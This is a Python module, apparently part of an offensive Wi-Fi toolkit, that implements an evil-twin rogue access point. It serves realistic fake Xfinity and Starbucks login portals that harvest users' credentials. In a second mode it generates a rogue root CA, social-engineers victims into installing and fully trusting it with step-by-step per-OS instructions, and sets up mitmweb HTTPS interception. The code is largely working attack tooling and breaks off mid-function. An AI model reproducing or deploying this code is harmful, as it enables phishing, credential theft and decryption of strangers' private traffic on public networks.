"""Evil Twin / Rogue AP captive-portal credential harvesting.

Mode A: open AP + HTTP captive portal (credential harvest only).
Mode B: open AP + HTTP captive portal + on-device CA install guide +
        mitmweb transparent HTTPS interception once the CA is trusted.
"""

import asyncio
import os
import secrets
import re
import base64
import plistlib
from pathlib import Path

from core.exec_utils import run_command, validate_mac, validate_channel, spawn_with_retry
from core.hardware import track_process
from core.models import save_result
from core.validation import sanitize_ssid
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")
CA_DIR = Path("captures/ca")

# ── Brand templates with embedded logos (base64) ──────────────────
STARBUCKS_LOGO = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDgwIDgwIj48Y2lyY2xlIGN4PSI0MCIgY3k9IjQwIiByPSIzNSIgZmlsbD0iIzAwNjI0MSIvPjx0ZXh0IHg9IjQwIiB5PSI0NSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+UzwvdGV4dD48L3N2Zz4="
XFINITY_LOGO = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDgwIDgwIj48Y2lyY2xlIGN4PSI0MCIgY3k9IjQwIiByPSIzNSIgZmlsbD0iIzAwNTVhYSIvPjx0ZXh0IHg9IjQwIiB5PSI0NSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+WDwvdGV4dD48L3N2Zz4="

def get_brand(ssid: str):
    ssid_lower = ssid.lower()
    if "xfinity" in ssid_lower:
        return {
            "logo": XFINITY_LOGO,
            "color": "#0055aa",
            "title": "xfinitywifi",
            "subtitle": "Comcast · Secure Connection",
            "portal_html": XFINITY_PORTAL_HTML,
        }
    elif "starbucks" in ssid_lower:
        return {
            "logo": STARBUCKS_LOGO,
            "color": "#006241",
            "title": "Starbucks WiFi",
            "subtitle": "Free Wi‑Fi · Enjoy your coffee",
            "portal_html": STARBUCKS_PORTAL_HTML,
        }
    else:
        return {
            "logo": STARBUCKS_LOGO,
            "color": "#006241",
            "title": "Starbucks WiFi",
            "subtitle": "Free Wi‑Fi · Enjoy your coffee",
            "portal_html": STARBUCKS_PORTAL_HTML,
        }

# ── OS detection ──────────────────────────────────────────────────────
def detect_os(user_agent: str):
    ua = user_agent.lower()
    if "iphone" in ua or "ipad" in ua:
        return {"family": "iOS", "name": "iPhone/iPad", "type": "mobile"}
    elif "android" in ua:
        return {"family": "Android", "name": "Android", "type": "mobile"}
    elif "windows" in ua:
        return {"family": "Windows", "name": "Windows", "type": "desktop"}
    elif "mac os" in ua:
        return {"family": "macOS", "name": "macOS", "type": "desktop"}
    else:
        return {"family": "Other", "name": "Unknown", "type": "unknown"}

# ── Probe responses – redirect Apple to trigger portal ──────────────
PROBE_RESPONSES = {
    "/hotspot-detect.html": (302, "", "", {"Location": "http://10.0.0.1/", "Cache-Control": "no-cache"}),
    "/library/test/success.html": (302, "", "", {"Location": "http://10.0.0.1/", "Cache-Control": "no-cache"}),
    "/generate_204": (204, "", "", {}),
    "/connecttest.txt": (200, "text/plain", "Microsoft Connect Test", {"Cache-Control": "no-cache"}),
    "/redirect": (200, "text/html", '<html><body>Redirecting...</body></html>', {"Cache-Control": "no-cache"}),
    "/captive": (200, "application/xml",
        '<?xml version="1.0" encoding="UTF-8"?><CaptiveNetwork><Status>Online</Status><LoginURL>http://10.0.0.1/</LoginURL></CaptiveNetwork>',
        {"Cache-Control": "no-cache"}),
    "/success": (200, "text/html", "Connected", {"Cache-Control": "no-cache"}),
}

# ── Mobileconfig generation ──────────────────────────────────────────
def generate_mobileconfig(ca_crt_path: Path, output_path: Path) -> bool:
    try:
        with open(ca_crt_path, "rb") as f:
            pem = f.read().decode('utf-8')
        b64 = ''.join(line for line in pem.splitlines() if not line.startswith('----'))
        der = base64.b64decode(b64)

        payload = {
            "PayloadVersion": 1,
            "PayloadUUID": secrets.token_hex(16).upper(),
            "PayloadType": "com.apple.security.root",
            "PayloadContent": der,
            "PayloadIdentifier": f"com.example.wifi.ca.{secrets.randbits(32)}",
            "PayloadDisplayName": "Wi-Fi Security Certificate",
            "PayloadDescription": "Installs root CA for secure browsing.",
        }
        profile = {
            "PayloadVersion": 1,
            "PayloadUUID": secrets.token_hex(16).upper(),
            "PayloadType": "Configuration",
            "PayloadIdentifier": "com.example.wifi.profile",
            "PayloadDisplayName": "Wi-Fi Security Profile",
            "PayloadDescription": "Installs trusted certificate.",
            "PayloadContent": [payload],
            "RemovalDisallowed": False,
        }
        with open(output_path, "wb") as f:
            plistlib.dump(profile, f)
        return True
    except Exception as e:
        console.print(f"[red]Error generating mobileconfig: {e}[/red]")
        return False

# ── HTML templates – Realistic Xfinity and Starbucks ─────────────────
XFINITY_PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>xfinitywifi · Sign In</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #eef2f7;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .card {{
            background: #ffffff;
            max-width: 440px;
            width: 100%;
            border-radius: 24px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.08);
            padding: 32px 28px 28px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 22px;
        }}
        .logo img {{
            max-width: 120px;
            height: auto;
        }}
        .logo h1 {{
            font-size: 28px;
            font-weight: 700;
            color: #0055aa;
            letter-spacing: -1px;
            margin-top: 6px;
        }}
        .logo h1 span {{ font-weight: 300; color: #333; }}
        .logo .sub {{
            font-size: 14px;
            color: #6b7a8a;
            margin-top: 2px;
        }}
        .notice {{
            background: #fef9e7;
            border-left: 5px solid #f1c40f;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 13px;
            color: #2c3e50;
            margin-bottom: 20px;
            line-height: 1.5;
        }}
        .notice strong {{ color: #1a2634; }}
        .form-group {{
            margin-bottom: 16px;
        }}
        label {{
            display: block;
            font-weight: 500;
            font-size: 14px;
            color: #2c3e50;
            margin-bottom: 5px;
        }}
        input[type="text"],
        input[type="password"] {{
            width: 100%;
            padding: 13px 16px;
            border: 1.5px solid #dce3ec;
            border-radius: 12px;
            font-size: 15px;
            background: #fafcff;
            transition: border-color 0.2s, box-shadow 0.2s;
            outline: none;
        }}
        input:focus {{
            border-color: #0055aa;
            box-shadow: 0 0 0 4px rgba(0,85,170,0.12);
        }}
        .checkbox-row {{
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 12px 0 18px;
        }}
        .checkbox-row input {{
            width: 18px;
            height: 18px;
            accent-color: #0055aa;
            margin: 0;
        }}
        .checkbox-row label {{
            font-size: 14px;
            color: #4a5a6a;
            margin: 0;
        }}
        .btn {{
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #0055aa 0%, #003d7a 100%);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 6px 18px rgba(0,85,170,0.25);
            position: relative;
        }}
        .btn:hover {{ transform: scale(1.01); box-shadow: 0 8px 24px rgba(0,85,170,0.35); }}
        .btn:active {{ transform: scale(0.97); }}
        .btn:disabled {{ opacity: 0.7; cursor: not-allowed; transform: none; }}
        .spinner {{
            display: none;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .btn.loading .spinner {{ display: block; }}
        .btn.loading .btn-text {{ display: none; }}
        .social-buttons {{
            display: flex;
            gap: 12px;
            margin: 14px 0 8px;
            justify-content: center;
        }}
        .social-btn {{
            flex: 1;
            padding: 10px;
            border: 1px solid #dce3ec;
            border-radius: 12px;
            background: #fff;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }}
        .social-btn:hover {{ background: #f5f7fa; border-color: #0055aa; }}
        .social-btn.google {{ color: #ea4335; }}
        .social-btn.guest {{ color: #6b7a8a; }}
        .divider {{
            display: flex;
            align-items: center;
            margin: 16px 0 14px;
        }}
        .divider::before, .divider::after {{
            content: "";
            flex: 1;
            border-top: 1px solid #dce3ec;
        }}
        .divider span {{
            padding: 0 12px;
            color: #8a9aa8;
            font-size: 13px;
        }}
        .links {{
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px 24px;
            margin: 18px 0 8px;
            font-size: 13px;
        }}
        .links a {{
            color: #0055aa;
            text-decoration: none;
            font-weight: 500;
        }}
        .links a:hover {{ text-decoration: underline; }}
        .footer {{
            text-align: center;
            color: #8a9aa8;
            font-size: 12px;
            margin-top: 16px;
            border-top: 1px solid #edf2f7;
            padding-top: 14px;
        }}
        @media (max-width: 480px) {{
            .card {{ padding: 28px 18px; }}
            .social-buttons {{ flex-direction: column; }}
        }}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <img src="{logo}" alt="xfinitywifi">
            <h1>xfinity<span>wifi</span></h1>
            <div class="sub">Comcast · Secure Connection</div>
        </div>
        {notice}
        <form id="loginForm" method="post" action="/login" onsubmit="return handleSubmit()">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" placeholder="Enter your credential" required autofocus>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="checkbox-row">
                <input type="checkbox" id="remember" name="remember" value="yes">
                <label for="remember">Remember my device</label>
            </div>
            <div class="checkbox-row">
                <input type="checkbox" id="terms" name="terms" value="yes" required>
                <label for="terms">I agree to the <a href="#" style="color:#0055aa;text-decoration:none;">Terms &amp; Conditions</a> and <a href="#" style="color:#0055aa;text-decoration:none;">Privacy Policy</a></label>
            </div>
            <button type="submit" class="btn" id="loginBtn">
                <span class="btn-text">Sign In</span>
                <span class="spinner"></span>
            </button>
        </form>
        <div class="divider"><span>or</span></div>
        <div class="social-buttons">
            <button class="social-btn google" onclick="socialLogin('google')">Sign in with Google</button>
            <button class="social-btn guest" onclick="socialLogin('guest')">Continue as Guest</button>
        </div>
        <div class="links">
            <a href="#">Forgot password?</a>
            <a href="#">Sign Up</a>
            <a href="#">Privacy Policy</a>
        </div>
        <div class="footer">By connecting, you agree to our Terms &amp; Privacy policy.</div>
    </div>
    <script>
        function handleSubmit() {{
            var btn = document.getElementById('loginBtn');
            btn.classList.add('loading');
            btn.disabled = true;
            return true;
        }}
        function socialLogin(type) {{
            var username = document.getElementById('username');
            var password = document.getElementById('password');
            if (type === 'google') {{
                username.value = 'google_user@example.com';
                password.value = 'google_password';
            }} else if (type === 'guest') {{
                username.value = 'guest_' + Math.random().toString(36).substring(2, 8);
                password.value = 'guest_' + Math.random().toString(36).substring(2, 8);
            }}
            document.getElementById('loginForm').submit();
        }}
        document.addEventListener('DOMContentLoaded', function() {{
            document.getElementById('username').focus();
        }});
    </script>
</body>
</html>"""

STARBUCKS_PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Starbucks WiFi · Sign In</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f5f5f0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .card {{
            background: #ffffff;
            max-width: 440px;
            width: 100%;
            border-radius: 24px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.08);
            padding: 32px 28px 28px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 22px;
        }}
        .logo img {{
            max-width: 120px;
            height: auto;
        }}
        .logo h1 {{
            font-size: 28px;
            font-weight: 700;
            color: #006241;
            letter-spacing: -0.5px;
            margin-top: 6px;
        }}
        .logo .sub {{
            font-size: 14px;
            color: #6b7a8a;
            margin-top: 2px;
        }}
        .notice {{
            background: #fef9e7;
            border-left: 5px solid #f1c40f;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 13px;
            color: #2c3e50;
            margin-bottom: 20px;
            line-height: 1.5;
        }}
        .notice strong {{ color: #1a2634; }}
        .form-group {{
            margin-bottom: 16px;
        }}
        label {{
            display: block;
            font-weight: 500;
            font-size: 14px;
            color: #2c3e50;
            margin-bottom: 5px;
        }}
        input[type="text"],
        input[type="password"] {{
            width: 100%;
            padding: 13px 16px;
            border: 1.5px solid #dce3ec;
            border-radius: 12px;
            font-size: 15px;
            background: #fafcff;
            transition: border-color 0.2s, box-shadow 0.2s;
            outline: none;
        }}
        input:focus {{
            border-color: #006241;
            box-shadow: 0 0 0 4px rgba(0,98,65,0.12);
        }}
        .checkbox-row {{
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 12px 0 18px;
        }}
        .checkbox-row input {{
            width: 18px;
            height: 18px;
            accent-color: #006241;
            margin: 0;
        }}
        .checkbox-row label {{
            font-size: 14px;
            color: #4a5a6a;
            margin: 0;
        }}
        .btn {{
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #006241 0%, #004d33 100%);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 6px 18px rgba(0,98,65,0.25);
            position: relative;
        }}
        .btn:hover {{ transform: scale(1.01); box-shadow: 0 8px 24px rgba(0,98,65,0.35); }}
        .btn:active {{ transform: scale(0.97); }}
        .btn:disabled {{ opacity: 0.7; cursor: not-allowed; transform: none; }}
        .spinner {{
            display: none;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .btn.loading .spinner {{ display: block; }}
        .btn.loading .btn-text {{ display: none; }}
        .social-buttons {{
            display: flex;
            gap: 12px;
            margin: 14px 0 8px;
            justify-content: center;
        }}
        .social-btn {{
            flex: 1;
            padding: 10px;
            border: 1px solid #dce3ec;
            border-radius: 12px;
            background: #fff;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }}
        .social-btn:hover {{ background: #f5f7fa; border-color: #006241; }}
        .social-btn.fb {{ color: #3b5998; }}
        .social-btn.guest {{ color: #6b7a8a; }}
        .divider {{
            display: flex;
            align-items: center;
            margin: 16px 0 14px;
        }}
        .divider::before, .divider::after {{
            content: "";
            flex: 1;
            border-top: 1px solid #dce3ec;
        }}
        .divider span {{
            padding: 0 12px;
            color: #8a9aa8;
            font-size: 13px;
        }}
        .links {{
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px 24px;
            margin: 18px 0 8px;
            font-size: 13px;
        }}
        .links a {{
            color: #006241;
            text-decoration: none;
            font-weight: 500;
        }}
        .links a:hover {{ text-decoration: underline; }}
        .footer {{
            text-align: center;
            color: #8a9aa8;
            font-size: 12px;
            margin-top: 16px;
            border-top: 1px solid #edf2f7;
            padding-top: 14px;
        }}
        @media (max-width: 480px) {{
            .card {{ padding: 28px 18px; }}
            .social-buttons {{ flex-direction: column; }}
        }}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <img src="{logo}" alt="Starbucks WiFi">
            <h1>Starbucks WiFi</h1>
            <div class="sub">Free Wi‑Fi · Enjoy your coffee</div>
        </div>
        {notice}
        <form id="loginForm" method="post" action="/login" onsubmit="return handleSubmit()">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" placeholder="Enter your credential" required autofocus>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="checkbox-row">
                <input type="checkbox" id="terms" name="terms" value="yes" required>
                <label for="terms">I agree to the <a href="#" style="color:#006241;text-decoration:none;">Terms &amp; Conditions</a> and <a href="#" style="color:#006241;text-decoration:none;">Privacy Policy</a></label>
            </div>
            <button type="submit" class="btn" id="loginBtn">
                <span class="btn-text">Sign In</span>
                <span class="spinner"></span>
            </button>
        </form>
        <div class="divider"><span>or</span></div>
        <div class="social-buttons">
            <button class="social-btn fb" onclick="socialLogin('fb')">Connect with Facebook</button>
            <button class="social-btn guest" onclick="socialLogin('guest')">Continue as Guest</button>
        </div>
        <div class="links">
            <a href="#">Forgot password?</a>
            <a href="#">Sign Up</a>
            <a href="#">Privacy Policy</a>
        </div>
        <div class="footer">By connecting, you agree to our Terms &amp; Privacy policy.</div>
    </div>
    <script>
        function handleSubmit() {{
            var btn = document.getElementById('loginBtn');
            btn.classList.add('loading');
            btn.disabled = true;
            return true;
        }}
        function socialLogin(type) {{
            var username = document.getElementById('username');
            var password = document.getElementById('password');
            if (type === 'fb') {{
                username.value = 'fb_user@example.com';
                password.value = 'fb_password';
            }} else if (type === 'guest') {{
                username.value = 'guest_' + Math.random().toString(36).substring(2, 8);
                password.value = 'guest_' + Math.random().toString(36).substring(2, 8);
            }}
            document.getElementById('loginForm').submit();
        }}
        document.addEventListener('DOMContentLoaded', function() {{
            document.getElementById('username').focus();
        }});
    </script>
</body>
</html>"""

# Success page after login (Mode B) – no QR code, only download links and instructions
SUCCESS_HTML_B = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Connected · Security Certificate</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f0f4f9;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .card {{
            background: #ffffff;
            max-width: 540px;
            width: 100%;
            border-radius: 24px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.08);
            padding: 32px 28px 24px;
        }}
        .header {{ text-align: center; margin-bottom: 12px; }}
        .icon {{ font-size: 52px; display: block; margin-bottom: 2px; }}
        h2 {{ font-weight: 700; font-size: 24px; color: #1a2634; }}
        .subtitle {{ color: #6b7a8a; font-size: 14px; margin-top: 2px; }}
        .download-area {{ text-align: center; margin: 16px 0 10px; }}
        .btn-download {{
            display: inline-block;
            background: linear-gradient(135deg, #0055aa 0%, #003d7a 100%);
            color: #fff;
            padding: 14px 40px;
            border-radius: 16px;
            text-decoration: none;
            font-weight: 600;
            font-size: 18px;
            box-shadow: 0 6px 18px rgba(0,85,170,0.25);
            transition: all 0.2s;
        }}
        .btn-download:hover {{ transform: scale(1.02); box-shadow: 0 8px 24px rgba(0,85,170,0.35); }}
        .btn-download:active {{ transform: scale(0.97); }}
        .instructions {{
            background: #f8fafc;
            padding: 16px 18px;
            border-radius: 16px;
            font-size: 13px;
            line-height: 1.6;
            color: #1a2634;
            margin-top: 14px;
        }}
        .instructions strong {{ color: #0f4a9e; }}
        .instructions .os {{ font-weight: 600; color: #1a2634; }}
        .footer {{
            text-align: center;
            color: #8a9aa8;
            font-size: 12px;
            margin-top: 16px;
            border-top: 1px solid #edf2f7;
            padding-top: 14px;
        }}
        @media (max-width: 480px) {{
            .card {{ padding: 24px 16px; }}
            .btn-download {{ width: 100%; text-align: center; }}
        }}
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <span class="icon">[check]</span>
            <h2>Connected successfully</h2>
            <div class="subtitle">One more step to complete secure browsing</div>
        </div>
        <div class="download-area">
            {button_html}
        </div>
        <div class="instructions">
            <strong>Installation instructions:</strong><br>
            {os_instructions}
        </div>
        <div class="footer">After installation, you can close this page and browse securely.</div>
    </div>
</body>
</html>"""

# Simple success for Mode A
SUCCESS_HTML_A = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f0f4f9;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }}
        .card {{
            background: #fff;
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.08);
            text-align: center;
        }}
        .icon {{ font-size: 56px; margin-bottom: 8px; }}
        h2 {{ font-size: 26px; color: #1a2634; margin: 8px 0 4px; }}
        p {{ color: #4a5a6a; font-size: 16px; margin-bottom: 20px; }}
        .btn {{
            display: inline-block;
            background: #0055aa;
            color: #fff;
            padding: 12px 36px;
            border-radius: 12px;
            text-decoration: none;
            font-weight: 600;
            box-shadow: 0 4px 12px rgba(0,85,170,0.25);
        }}
        .btn:hover {{ background: #003d7a; }}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">[globe]</div>
        <h2>You are now online</h2>
        <p>Your connection is active. You can close this page and start browsing.</p>
        <a href="http://www.google.com" class="btn">Go to Google</a>
    </div>
</body>
</html>"""

# OS-specific instructions (simplified)
OS_INSTRUCTIONS = {
    "iOS": """
        <span class="os">iPhone/iPad:</span> After downloading the profile, go to <em>Settings -> VPN & Device Management</em>,
        tap the downloaded profile, then tap "Install". Follow the prompts to complete installation.
        After installation, go to <em>Settings -> General -> About -> Certificate Trust Settings</em>
        and enable full trust for the new CA.<br>
        <span style="font-size:12px;color:#6b7a8a;">If the profile doesn't appear, open the downloaded file in Files app.</span>
    """,
    "Android": """
        <span class="os">Android:</span> After downloading, open the file and choose "Install".
        Then go to <em>Settings -> Security -> Encryption & credentials -> Install a certificate -> CA certificate</em>,
        and select the downloaded file.<br>
        <span style="font-size:12px;color:#6b7a8a;">On some devices, the path may be <em>Settings -> Biometrics and security -> Install from storage</em>.</span>
    """,
    "Windows": """
        <span class="os">Windows:</span> Double-click the downloaded file,
        click "Install Certificate", choose "Local Machine", then "Place all certificates in the following store"
        -> browse and select "Trusted Root Certification Authorities".<br>
        <span style="font-size:12px;color:#6b7a8a;">You may need to restart your browser.</span>
    """,
    "macOS": """
        <span class="os">macOS:</span> Double-click the downloaded file,
        it will open in Keychain Access. Find the certificate in the "login" keychain, double-click it,
        expand "Trust", and set "Secure Sockets Layer (SSL)" to "Always Trust".<br>
        <span style="font-size:12px;color:#6b7a8a;">You may need to enter your admin password.</span>
    """,
    "Other": """
        <span class="os">Unknown device:</span> Please download and install the certificate as a trusted root CA.
        Consult your device's documentation for specific steps.
    """
}

async def run_evil_twin(
    interface_a: str, interface_b: str, ssid: str, channel: str, bssid: str = "",
    mode: str = "A", portal_template: str = "xfinitywifi", local_port: int = 80,
) -> None:
    header("Evil Twin / Rogue AP")
    if not validate_channel(channel):
        err("Invalid channel"); return
    if bssid and not validate_mac(bssid):
        err("Invalid BSSID"); return
    try:
        ssid = sanitize_ssid(ssid)
    except ValueError as e:
        err(str(e)); return
    if mode == "B" and not interface_b:
        err("Mode B (HTTPS decryption) requires --iface-b for the mitmweb listener/uplink"); return
    if mode == "B":
        import shutil
        if shutil.which("mitmweb") is None:
            err("mitmweb not found. Install with: pip install mitmproxy  (or: sudo apt install mitmproxy)"); return
        if shutil.which("openssl") is None:
            err("openssl not found -- required to generate the rogue CA."); return
    else:
        pass

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    if interface_a not in os.listdir("/sys/class/net"):
        err(f"Interface {interface_a} not found"); return

    # ── Check current interface mode ──────────────────────────────────────
    try:
        info_out = await run_command(["sudo", "iw", "dev", interface_a, "info"])
        if "type AP" not in info_out and "type master" not in info_out:
            warn(f"Interface {interface_a} is not in AP mode. Trying to set it.")
        else:
            info(f"Interface {interface_a} is already in AP mode.")
    except Exception:
        pass

    rogue_bssid = bssid or ":".join(f"{secrets.randbits(8):02x}" for _ in range(6))

    hostapd_conf = CAPTURE_DIR / f"evil_twin_hostapd_{ssid.replace(' ','_')}.conf"
    hostapd_conf.write_text(
        f"interface={interface_a}\n"
        f"driver=nl80211\n"
        f"ssid={ssid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        f"country_code=US\n"
        f"ieee80211n=1\n"
        f"wmm_enabled=1\n"
        f"ht_capab=[HT40-]\n"
        f"bssid={rogue_bssid}\n"
    )

    dnsmasq_conf = CAPTURE_DIR / f"evil_twin_dnsmasq_{ssid.replace(' ','_')}.conf"
    dnsmasq_conf.write_text(
        f"interface={interface_a}\n"
        f"dhcp-range=10.0.0.10,10.0.0.250,12h\n"
        f"address=/#/10.0.0.1\n"
    )

    # ── Clean up and set AP mode (warn but continue) ─────────────────────
    try:
        await run_command(["sudo", "airmon-ng", "check", "kill"])
    except Exception:
        pass
    try:
        await run_command(["sudo", "systemctl", "stop", "NetworkManager"])
    except Exception:
        pass
    try:
        await run_command(["sudo", "systemctl", "stop", "wpa_supplicant"])
    except Exception:
        pass

    # Disconnect from any network
    try:
        await run_command(["sudo", "nmcli", "device", "disconnect", interface_a])
    except Exception:
        pass
    try:
        await run_command(["sudo", "iw", "dev", interface_a, "disconnect"])
    except Exception:
        pass

    await run_command(["sudo", "ip", "link", "set", interface_a, "down"])
    await run_command(["sudo", "ip", "addr", "flush", "dev", interface_a])

    try:
        await run_command(["sudo", "iw", "reg", "set", "US"])
    except Exception:
        pass

    await asyncio.sleep(1)

    # ── Attempt to set AP mode – warn on failure, but continue ──────────
    set_ap_success = False
    try:
        info_out = await run_command(["sudo", "iw", "dev", interface_a, "info"])
        match = re.search(r"wiphy (\d+)", info_out)
        if match:
            phy_num = match.group(1)
            await run_command(["sudo", "iw", f"phy{phy_num}", "set", "interface", interface_a, "type", "ap"])
            set_ap_success = True
            info(f"Set {interface_a} to AP mode using phy{phy_num}.")
        else:
            await run_command(["sudo", "iw", "dev", interface_a, "set", "type", "ap"])
            set_ap_success = True
            info(f"Set {interface_a} to AP mode using iw dev.")
    except Exception as e:
        warn(f"iw method failed: {e}")
        try:
            await run_command(["sudo", "iwconfig", interface_a, "mode", "master"])
            set_ap_success = True
            info(f"Set {interface_a} to AP mode using iwconfig.")
        except Exception as e2:
            warn(f"iwconfig method failed: {e2}")

    if not set_ap_success:
        warn("All AP mode setting methods failed. Continuing anyway – hostapd may still work.")
    else:
        try:
            info_out = await run_command(["sudo", "iw", "dev", interface_a, "info"])
            if "type AP" in info_out or "type master" in info_out:
                info(f"Confirmed: {interface_a} is in AP mode.")
            else:
                warn(f"Interface {interface_a} may not be in AP mode (current info: {info_out})")
        except Exception:
            pass

    # Bring up and assign IP
    await run_command(["sudo", "ip", "link", "set", interface_a, "up"])
    await run_command(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", interface_a])
    await asyncio.sleep(1)

    info(f"Starting rogue AP '{ssid}' on {interface_a} (BSSID {rogue_bssid})...")
    hostapd_proc, started, stderr_out = await spawn_with_retry(
        ["sudo", "hostapd", str(hostapd_conf)],
        check_seconds=2.0, max_attempts=3, retry_delay=2.0, label="hostapd",
    )
    if not started:
        err(f"hostapd failed to start. stderr:\n{stderr_out}")
        err("This usually means the interface does not support AP mode or the driver is not loaded correctly.")
        err("Try using the other NIC (e.g., wlan1) as the AP interface.")
        try:
            hostapd_conf.unlink(); dnsmasq_conf.unlink()
        except: pass
        try:
            await run_command(["sudo", "systemctl", "start", "NetworkManager"])
        except: pass
        return
    track_process(hostapd_proc)

    dnsmasq_proc = await asyncio.create_subprocess_exec(
        "sudo", "dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
    )
    track_process(dnsmasq_proc)
    ok("Rogue AP + DHCP running.")

    # ── Mode B: generate CA and start mitmweb ──
    mitm_proc = None
    ca_crt_path = None
    mobileconfig_path = None

    if mode == "B":
        CA_DIR.mkdir(parents=True, exist_ok=True)
        ca_key = CA_DIR / "rogueCA.key"
        ca_crt = CA_DIR / "rogueCA.crt"
        info("Generating rogue root CA for HTTPS interception...")
        await run_command(["openssl", "genrsa", "-out", str(ca_key), "2048"])
        await run_command([
            "openssl", "req", "-x509", "-new", "-nodes", "-key", str(ca_key),
            "-sha256", "-days", "365", "-out", str(ca_crt),
            "-subj", "/CN=Wi-Fi Root CA/O=Network Operations/C=US",
        ])
        ca_crt_path = ca_crt

        if not ca_crt.exists() or ca_crt.stat().st_size == 0:
            err(f"CA certificate generation failed.")
            for p in (hostapd_proc, dnsmasq_proc):
                if p.returncode is None: p.terminate()
            await run_command(["sudo", "ip", "addr", "flush", "dev", interface_a])
            try: await run_command(["sudo", "systemctl", "start", "NetworkManager"])
            except: pass
            return

        mobileconfig_path = CA_DIR / "ca.mobileconfig"
        if generate_mobileconfig(ca_crt, mobileconfig_path):
